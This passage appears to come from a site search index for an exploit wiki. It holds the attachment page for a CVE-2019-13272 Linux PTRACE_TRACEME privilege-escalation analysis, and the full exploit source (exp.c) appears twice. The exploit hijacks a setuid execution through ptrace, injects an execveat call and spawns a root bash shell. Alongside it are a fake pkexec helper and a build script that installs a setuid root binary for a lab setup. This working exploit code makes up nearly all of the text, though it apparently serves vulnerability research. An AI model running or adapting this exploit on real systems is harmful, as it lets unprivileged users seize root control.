            "location": "/kernel/cve-2019-13272-\u5206\u6790/#b_2",
            "text": "",
            "title": "b.\u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#c_4",
            "text": "",
            "title": "c.\u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#6",
            "text": "broken permission and object lifetime handling for PTRACE_TRACEME",
            "title": "6.\u53c2\u8003"
        },
        {
            "location": "/kernel/cve-2019-13272-\u9644\u4ef6/",
            "text": "PTRACE_TRACEME \u672c\u5730\u63d0\u6743\u6f0f\u6d1e(CVE-2019-13272)\u5206\u6790\u9644\u4ef6\n\n\nexp \u6e90\u7801\n\n\nmake.sh\n\n\ngcc -o exp exp.c\ngcc -o fakepkexec fakepkexec.c\ngcc -o fakehelper fakehelper.c \nmv exp  /tmp/\nmv fakehelper  /tmp/\nmv fakepkexec /tmp/\n\nuseradd test\nchown test:test /tmp/exp  /tmp/fakehelper\nchown root:root /tmp/fakepkexec\nchmod u+s  /tmp/fakepkexec \nsu test \n\n\n\n\nfakepkexec.c\n\n\n#define _GNU_SOURCE\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <string.h>\n#include <fcntl.h>\n#include <err.h>\n#include <pwd.h>\n#include <errno.h>\n\n\nint\nmain (int argc, char *argv[])\n{\n    char* user;\n    char* command;\n\n    if(geteuid() != 0) {\n        err(2, \"pkexec must be setuid root\\n\");\n        goto out;\n    }\n    if(strcmp(argv[1], \"--user\") != 0) {\n        err(2, \"must setting a new user\\n\");\n        goto out;\n    }\n    user = strdup(argv[2]);\n\n    struct passwd *pw = getpwnam(user);\n    if (pw == NULL) err(2, \"getpwuid\");\n\n    sleep(1);\n\n    setregid (pw->pw_gid, pw->pw_gid);\n    setreuid (pw->pw_uid, pw->pw_uid);\n    if ((geteuid () != pw->pw_uid) || (getuid () != pw->pw_uid) ||\n            (getegid () != pw->pw_gid) || (getgid () != pw->pw_gid))\n    {\n        err(2, \"Error becoming real+effective uid %d and gid %d: %s\\n\",pw->pw_uid, pw->pw_gid, strerror(errno));\n        goto out;\n    }\n\n    execl(\"/tmp/fakehelper\", \"fakehelper\", \"--help\", NULL);\nout:\n    err(2, \"execl fakehelper\");\n}\n\n\n\n\nfakehelper.c\n\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <signal.h>\n\n\nint\nmain (int argc, char *argv[])\n{\n    printf(\"run fakehelper pid=%d euid = %d\\n\", getpid(), geteuid());\n}\n\n\n\n\n\nexp.c\n\n\n#define _GNU_SOURCE\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <err.h>\n#include <signal.h>\n#include <stdio.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <stddef.h>\n#include <stdarg.h>\n#include <pwd.h>\n#include <sys/prctl.h>\n#include <sys/wait.h>\n#include <sys/ptrace.h>\n#include <sys/user.h>\n#include <sys/syscall.h>\n#include <sys/stat.h>\n#include <linux/elf.h>\n\n#define SAFE(expr) ({                   \\\n  typeof(expr) __res = (expr);          \\\n  if (__res == -1) err(1, \"%s\", #expr); \\\n  __res;                                \\\n})\n#define max(a,b) ((a)>(b) ? (a) : (b))\n\nstatic int middle_success = 1;\nstatic int block_pipe[2];\nstatic int self_fd = -1;\nstatic int dummy_status;\nstatic const char *helper_path;\n\n/* temporary printf; returned pointer is valid until next tprintf */\nstatic char *tprintf(char *fmt, ...) {\n  static char buf[10000];\n  va_list ap;\n  va_start(ap, fmt);\n  vsprintf(buf, fmt, ap);\n  va_end(ap);\n  return buf;\n}\n\nstatic int middle_main(void *dummy) {\n  prctl(PR_SET_PDEATHSIG, SIGKILL);\n  pid_t middle = getpid();\n\n  self_fd = SAFE(open(\"/proc/self/exe\", O_RDONLY));\n\n  pid_t child = SAFE(fork());\n  if (child == 0) {\n    prctl(PR_SET_PDEATHSIG, SIGKILL);\n\n    SAFE(dup2(self_fd, 42));\n\n    /* spin until our parent becomes privileged (have to be fast here) */\n    int proc_fd = SAFE(open(tprintf(\"/proc/%d/status\", middle), O_RDONLY));\n    char *needle = tprintf(\"\\nUid:\\t%d\\t0\\t\", getuid());\n    while (1) {\n      char buf[1000];\n      ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));\n      buf[buflen] = '\\0';\n      if (strstr(buf, needle)) break;\n    }\n\n    /*\n     * this is where the bug is triggered.\n     * while our parent is in the middle of pkexec, we force it to become our\n     * tracer, with pkexec's creds as ptracer_cred.\n     */\n    SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));\n\n    /*\n     * now we execute passwd. because the ptrace relationship is considered to\n     * be privileged, this is a proper suid execution despite the attached\n     * tracer, not a degraded one.\n     * at the end of execve(), this process receives a SIGTRAP from ptrace.\n     */\n    puts(\"executing passwd\");\n    execl(\"/usr/bin/passwd\", \"passwd\", NULL);\n    err(1, \"execl passwd\");\n  }\n\n  SAFE(dup2(self_fd, 0));\n  SAFE(dup2(block_pipe[1], 1));\n\n  struct passwd *pw = getpwuid(getuid());\n  if (pw == NULL) err(1, \"getpwuid\");\n\n  middle_success = 1;\n  execl(\"/tmp/fakepkexec\", \"fakepkexec\", \"--user\", pw->pw_name, NULL);\n  middle_success = 0;\n  err(1, \"execl pkexec\");\n}\n\nstatic void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {\n  struct user_regs_struct regs;\n  struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };\n  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));\n  SAFE(waitpid(pid, &dummy_status, 0));\n  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));\n\n  /* set up indirect arguments */\n  unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;\n  struct injected_page {\n    unsigned long argv[2];\n    unsigned long envv[1];\n    char arg0[8];\n    char path[1];\n  } ipage = {\n    .argv = { scratch_area + offsetof(struct injected_page, arg0) }\n  };\n  strcpy(ipage.arg0, arg0);\n  for (int i = 0; i < sizeof(ipage)/sizeof(long); i++) {\n    unsigned long pdata = ((unsigned long *)&ipage)[i];\n    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),\n                (void*)pdata));\n  }\n\n  /* execveat(exec_fd, path, argv, envv, flags) */\n  regs.orig_rax = __NR_execveat;\n  regs.rdi = exec_fd;\n  regs.rsi = scratch_area + offsetof(struct injected_page, path);\n  regs.rdx = scratch_area + offsetof(struct injected_page, argv);\n  regs.r10 = scratch_area + offsetof(struct injected_page, envv);\n  regs.r8 = AT_EMPTY_PATH;\n\n  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));\n  SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));\n  SAFE(waitpid(pid, &dummy_status, 0));\n}\n\nstatic int middle_stage2(void) {\n  /* our child is hanging in signal delivery from execve()'s SIGTRAP */\n  pid_t child = SAFE(waitpid(-1, &dummy_status, 0));\n  force_exec_and_wait(child, 42, \"stage3\");\n  return 0;\n}\n\nstatic int spawn_shell(void) {\n  SAFE(setresgid(0, 0, 0));\n  SAFE(setresuid(0, 0, 0));\n  execlp(\"bash\", \"bash\", NULL);\n  err(1, \"execlp\");\n}\n\nint main(int argc, char **argv) {\n  if (strcmp(argv[0], \"stage2\") == 0)\n    return middle_stage2();\n  if (strcmp(argv[0], \"stage3\") == 0)\n    return spawn_shell();\n\n  helper_path = \"/tmp/fakehelper\";\n\n  /*\n   * set up a pipe such that the next write to it will block: packet mode,\n   * limited to one packet\n   */\n  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));\n  SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));\n  char dummy = 0;\n  SAFE(write(block_pipe[1], &dummy, 1));\n\n  /* spawn pkexec in a child, and continue here once our child is in execve() */\n  static char middle_stack[1024*1024];\n  pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),\n                            CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));\n  if (!middle_success) return 1;\n\n  /*\n   * wait for our child to go through both execve() calls (first pkexec, then\n   * the executable permitted by polkit policy).\n   */\n  while (1) {\n    int fd = open(tprintf(\"/proc/%d/comm\", midpid), O_RDONLY);\n    char buf[16];\n    int buflen = SAFE(read(fd, buf, sizeof(buf)-1));\n    buf[buflen] = '\\0';\n    *strchrnul(buf, '\\n') = '\\0';\n    if (strncmp(buf, basename(helper_path), 15) == 0)\n      break;\n    usleep(100000);\n  }\n\n  /*\n   * our child should have gone through both the privileged execve() and the\n   * following execve() here\n   */\n  SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));\n  SAFE(waitpid(midpid, &dummy_status, 0));\n  fputs(\"attached to midpid\\n\", stderr);\n\n  force_exec_and_wait(midpid, 0, \"stage2\");\n  return 0;\n}",
            "title": "Cve 2019 13272 \u9644\u4ef6"
        },
        {
            "location": "/kernel/cve-2019-13272-\u9644\u4ef6/#ptrace_traceme-cve-2019-13272",
            "text": "",
            "title": "PTRACE_TRACEME \u672c\u5730\u63d0\u6743\u6f0f\u6d1e(CVE-2019-13272)\u5206\u6790\u9644\u4ef6"
        },
        {
            "location": "/kernel/cve-2019-13272-\u9644\u4ef6/#exp",
            "text": "",
            "title": "exp \u6e90\u7801"
        },
        {
            "location": "/kernel/cve-2019-13272-\u9644\u4ef6/#makesh",
            "text": "gcc -o exp exp.c\ngcc -o fakepkexec fakepkexec.c\ngcc -o fakehelper fakehelper.c \nmv exp  /tmp/\nmv fakehelper  /tmp/\nmv fakepkexec /tmp/\n\nuseradd test\nchown test:test /tmp/exp  /tmp/fakehelper\nchown root:root /tmp/fakepkexec\nchmod u+s  /tmp/fakepkexec \nsu test",
            "title": "make.sh"
        },
        {
            "location": "/kernel/cve-2019-13272-\u9644\u4ef6/#fakepkexecc",
            "text": "#define _GNU_SOURCE\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <string.h>\n#include <fcntl.h>\n#include <err.h>\n#include <pwd.h>\n#include <errno.h>\n\n\nint\nmain (int argc, char *argv[])\n{\n    char* user;\n    char* command;\n\n    if(geteuid() != 0) {\n        err(2, \"pkexec must be setuid root\\n\");\n        goto out;\n    }\n    if(strcmp(argv[1], \"--user\") != 0) {\n        err(2, \"must setting a new user\\n\");\n        goto out;\n    }\n    user = strdup(argv[2]);\n\n    struct passwd *pw = getpwnam(user);\n    if (pw == NULL) err(2, \"getpwuid\");\n\n    sleep(1);\n\n    setregid (pw->pw_gid, pw->pw_gid);\n    setreuid (pw->pw_uid, pw->pw_uid);\n    if ((geteuid () != pw->pw_uid) || (getuid () != pw->pw_uid) ||\n            (getegid () != pw->pw_gid) || (getgid () != pw->pw_gid))\n    {\n        err(2, \"Error becoming real+effective uid %d and gid %d: %s\\n\",pw->pw_uid, pw->pw_gid, strerror(errno));\n        goto out;\n    }\n\n    execl(\"/tmp/fakehelper\", \"fakehelper\", \"--help\", NULL);\nout:\n    err(2, \"execl fakehelper\");\n}",
            "title": "fakepkexec.c"
        },
        {
            "location": "/kernel/cve-2019-13272-\u9644\u4ef6/#fakehelperc",
            "text": "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <signal.h>\n\n\nint\nmain (int argc, char *argv[])\n{\n    printf(\"run fakehelper pid=%d euid = %d\\n\", getpid(), geteuid());\n}",
            "title": "fakehelper.c"
        },
        {
            "location": "/kernel/cve-2019-13272-\u9644\u4ef6/#expc",
            "text": "#define _GNU_SOURCE\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <err.h>\n#include <signal.h>\n#include <stdio.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <stddef.h>\n#include <stdarg.h>\n#include <pwd.h>\n#include <sys/prctl.h>\n#include <sys/wait.h>\n#include <sys/ptrace.h>\n#include <sys/user.h>\n#include <sys/syscall.h>\n#include <sys/stat.h>\n#include <linux/elf.h>\n\n#define SAFE(expr) ({                   \\\n  typeof(expr) __res = (expr);          \\\n  if (__res == -1) err(1, \"%s\", #expr); \\\n  __res;                                \\\n})\n#define max(a,b) ((a)>(b) ? (a) : (b))\n\nstatic int middle_success = 1;\nstatic int block_pipe[2];\nstatic int self_fd = -1;\nstatic int dummy_status;\nstatic const char *helper_path;\n\n/* temporary printf; returned pointer is valid until next tprintf */\nstatic char *tprintf(char *fmt, ...) {\n  static char buf[10000];\n  va_list ap;\n  va_start(ap, fmt);\n  vsprintf(buf, fmt, ap);\n  va_end(ap);\n  return buf;\n}\n\nstatic int middle_main(void *dummy) {\n  prctl(PR_SET_PDEATHSIG, SIGKILL);\n  pid_t middle = getpid();\n\n  self_fd = SAFE(open(\"/proc/self/exe\", O_RDONLY));\n\n  pid_t child = SAFE(fork());\n  if (child == 0) {\n    prctl(PR_SET_PDEATHSIG, SIGKILL);\n\n    SAFE(dup2(self_fd, 42));\n\n    /* spin until our parent becomes privileged (have to be fast here) */\n    int proc_fd = SAFE(open(tprintf(\"/proc/%d/status\", middle), O_RDONLY));\n    char *needle = tprintf(\"\\nUid:\\t%d\\t0\\t\", getuid());\n    while (1) {\n      char buf[1000];\n      ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));\n      buf[buflen] = '\\0';\n      if (strstr(buf, needle)) break;\n    }\n\n    /*\n     * this is where the bug is triggered.\n     * while our parent is in the middle of pkexec, we force it to become our\n     * tracer, with pkexec's creds as ptracer_cred.\n     */\n    SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));\n\n    /*\n     * now we execute passwd. because the ptrace relationship is considered to\n     * be privileged, this is a proper suid execution despite the attached\n     * tracer, not a degraded one.\n     * at the end of execve(), this process receives a SIGTRAP from ptrace.\n     */\n    puts(\"executing passwd\");\n    execl(\"/usr/bin/passwd\", \"passwd\", NULL);\n    err(1, \"execl passwd\");\n  }\n\n  SAFE(dup2(self_fd, 0));\n  SAFE(dup2(block_pipe[1], 1));\n\n  struct passwd *pw = getpwuid(getuid());\n  if (pw == NULL) err(1, \"getpwuid\");\n\n  middle_success = 1;\n  execl(\"/tmp/fakepkexec\", \"fakepkexec\", \"--user\", pw->pw_name, NULL);\n  middle_success = 0;\n  err(1, \"execl pkexec\");\n}\n\nstatic void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {\n  struct user_regs_struct regs;\n  struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };\n  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));\n  SAFE(waitpid(pid, &dummy_status, 0));\n  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));\n\n  /* set up indirect arguments */\n  unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;\n  struct injected_page {\n    unsigned long argv[2];\n    unsigned long envv[1];\n    char arg0[8];\n    char path[1];\n  } ipage = {\n    .argv = { scratch_area + offsetof(struct injected_page, arg0) }\n  };\n  strcpy(ipage.arg0, arg0);\n  for (int i = 0; i < sizeof(ipage)/sizeof(long); i++) {\n    unsigned long pdata = ((unsigned long *)&ipage)[i];\n    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),\n                (void*)pdata));\n  }\n\n  /* execveat(exec_fd, path, argv, envv, flags) */\n  regs.orig_rax = __NR_execveat;\n  regs.rdi = exec_fd;\n  regs.rsi = scratch_area + offsetof(struct injected_page, path);\n  regs.rdx = scratch_area + offsetof(struct injected_page, argv);\n  regs.r10 = scratch_area + offsetof(struct injected_page, envv);\n  regs.r8 = AT_EMPTY_PATH;\n\n  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));\n  SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));\n  SAFE(waitpid(pid, &dummy_status, 0));\n}\n\nstatic int middle_stage2(void) {\n  /* our child is hanging in signal delivery from execve()'s SIGTRAP */\n  pid_t child = SAFE(waitpid(-1, &dummy_status, 0));\n  force_exec_and_wait(child, 42, \"stage3\");\n  return 0;\n}\n\nstatic int spawn_shell(void) {\n  SAFE(setresgid(0, 0, 0));\n  SAFE(setresuid(0, 0, 0));\n  execlp(\"bash\", \"bash\", NULL);\n  err(1, \"execlp\");\n}\n\nint main(int argc, char **argv) {\n  if (strcmp(argv[0], \"stage2\") == 0)\n    return middle_stage2();\n  if (strcmp(argv[0], \"stage3\") == 0)\n    return spawn_shell();\n\n  helper_path = \"/tmp/fakehelper\";\n\n  /*\n   * set up a pipe such that the next write to it will block: packet mode,\n   * limited to one packet\n   */\n  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));\n  SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));\n  char dummy = 0;\n  SAFE(write(block_pipe[1], &dummy, 1));\n\n  /* spawn pkexec in a child, and continue here once our child is in execve() */\n  static char middle_stack[1024*1024];\n  pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),\n                            CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));\n  if (!middle_success) return 1;\n\n  /*\n   * wait for our child to go through both execve() calls (first pkexec, then\n   * the executable permitted by polkit policy).\n   */\n  while (1) {\n    int fd = open(tprintf(\"/proc/%d/comm\", midpid), O_RDONLY);\n    char buf[16];\n    int buflen = SAFE(read(fd, buf, sizeof(buf)-1));\n    buf[buflen] = '\\0';\n    *strchrnul(buf, '\\n') = '\\0';\n    if (strncmp(buf, basename(helper_path), 15) == 0)\n      break;\n    usleep(100000);\n  }\n\n  /*\n   * our child should have gone through both the privileged execve() and the\n   * following execve() here\n   */\n  SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));\n  SAFE(waitpid(midpid, &dummy_status, 0));\n  fputs(\"attached to midpid\\n\", stderr);\n\n  force_exec_and_wait(midpid, 0, \"stage2\");\n  return 0;\n}",
            "title": "exp.c"
        },
        {
            "location": "/acknowledgements/",
            "text": "Acknowledgements\n\n\nThe expwiki Team would like to thank the following people and parties for participating this project.\n\n\n\n\nchengjia4574@gmail.com from IceSwordLab\n\n\ninvincible1944@gmail.com from IceSwordLab",
            "title": "\u81f4\u8c22"
        },
        {
            "location": "/acknowledgements/#acknowledgements",
            "text": "The expwiki Team would like to thank the following people and parties for participating this project.   chengjia4574@gmail.com from IceSwordLab  invincible1944@gmail.com from IceSwordLab",
            "title": "Acknowledgements"
        }
    ]
}